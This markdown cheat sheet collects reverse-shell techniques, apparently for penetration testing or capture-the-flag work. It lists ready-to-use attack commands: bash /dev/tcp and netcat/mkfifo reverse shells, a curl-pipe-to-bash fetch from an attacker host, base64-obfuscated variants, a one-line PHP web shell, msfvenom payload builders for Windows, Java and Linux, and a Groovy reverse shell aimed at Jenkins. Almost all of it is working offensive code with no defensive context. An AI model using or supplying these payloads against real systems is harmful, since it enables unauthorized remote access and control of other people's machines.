# Shell

## Reverse shell

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [revshells](https://www.revshells.com/)

```
#!/bin/bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```
```
curl http://<lhost>/shell.sh|bash
```
```
echo -n "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" | base64
echo <base64-shell> | base64 -d | bash
{echo,<base64-shell>}|{base64,-d}|bash
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <lhost> <lport> >/tmp/f
```
```
<?php system($_REQUEST['cmd']); ?>
```

Listen for reverse shell with netcat:
```
nc -nvlp <port>
```

### Msfvenom
```
msfvenom -l payloads

msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war > shell.war
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell.elf
```

### Groovy (for Jenkins)
```java
String host="<lhost>";
int port=9001;
String cmd="whoami";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Interactive shell

### Linux

1. ``python3 -c 'import pty; pty.spawn("/bin/bash")'``
2. ``CTRL+Z``
3. ``stty raw -echo && fg``

### Windows

``rlwrap nc -nvlp <port>``
